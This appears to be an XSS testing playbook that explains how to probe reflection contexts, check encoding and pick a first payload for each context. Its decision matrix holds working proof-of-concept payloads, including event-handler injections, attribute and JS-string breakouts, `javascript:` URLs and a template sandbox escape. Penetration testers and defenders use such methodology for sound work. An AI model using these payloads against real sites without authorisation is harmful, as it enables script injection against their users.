# Context Detection Playbook

## Why Context Matters
The same payload behaves differently depending on where it lands. A `<script>` tag works in HTML body but breaks JavaScript syntax inside a JS string. Always determine context before choosing payloads.

## Step 1: Inject Probe
Send a unique string and observe where it appears in the response:
```
PROBE123
"PROBE123
'PROBE123
`PROBE123
<PROBE123>
{PROBE123}
{{PROBE123}}
${PROBE123}
<%= PROBE123 %>
```

## Step 2: Analyze Reflection

| Probe in Response | Context |
|-------------------|---------|
| `>PROBE123<` | HTML body (between tags) |
| `"PROBE123"` | Double-quoted attribute value |
| `'PROBE123'` | Single-quoted attribute value |
| `` `PROBE123` `` | Backtick attribute or JS template literal |
| `PROBE123` (no quotes) | Unquoted attribute |
| `<script>...PROBE123...</script>` | Inside script block |
| `"PROBE123"` in `var x = "..."` | JS string (double-quoted) |
| `'PROBE123'` in `var x = '...'` | JS string (single-quoted) |
| `` `PROBE123` `` in JS | JS template literal |
| `PROBE123` in `onclick="..."` | Event handler attribute |
| `PROBE123` in `href="..."` | href/src attribute |
| `{{PROBE123}}` in body | Template engine (Angular/Vue) |
| PROBE123 in `<style>` | CSS context |

## Step 3: Verify Context

### HTML Body
```
Test: <b>PROBE123</b>
If `PROBE123` is bold → HTML context (tags render)
If `<b>PROBE123</b>` shown → HTML-encoded (no XSS here)
```

### Attribute
```
Test: <div class="PROBE123">
If PROBE123 is inside quotes → we can break out with "
If `&quot;` shown → HTML-encoded
```

### Script
```
Test: <script>var x = "PROBE123"</script>
If PROBE123 appears unmodified in source → JS string context
If `\"PROBE123\"` → backslash-escaped
If `PROBE123` unescaped → direct XSS
```

### Event Handler
```
Test: <div onclick="PROBE123">
If PROBE123 is inside → can inject `alert(1)`
```

## Step 4: Encoding Check
Check if the app applies any encoding:
- `>` → `&gt;` or `\u003e` or `>` ?
- `<` → `&lt;` or `\u003c` ?
- `"` → `&quot;` or `\"` or `\\"` ?
- `'` → `&#x27;` or `\'` ?

This tells you what filter you need to bypass.

## Step 5: Context Decision Matrix

| Detected Context | First Payload to Try |
|-----------------|---------------------|
| HTML body | `<img src=x onerror=alert(1)>` |
| Double-quoted attr | `" autofocus onfocus=alert(1) x="` |
| Single-quoted attr | `' autofocus onfocus=alert(1) x='` |
| Unquoted attr | `autofocus onfocus=alert(1)` |
| JS string (double) | `\";alert(1);//` |
| JS string (single) | `';alert(1);//` |
| Template literal JS | `${alert(1)}` |
| Inline event handler | `alert(1)` |
| href/src | `javascript:alert(1)` |
| CSS/style | `</style><img src=x onerror=alert(1)>` |
| Template ({{ }}) | `{{constructor.constructor('alert(1)')()}}` |
| JSON/API response | Check Content-Type; try `"><img src=x onerror=alert(document.domain)>` |
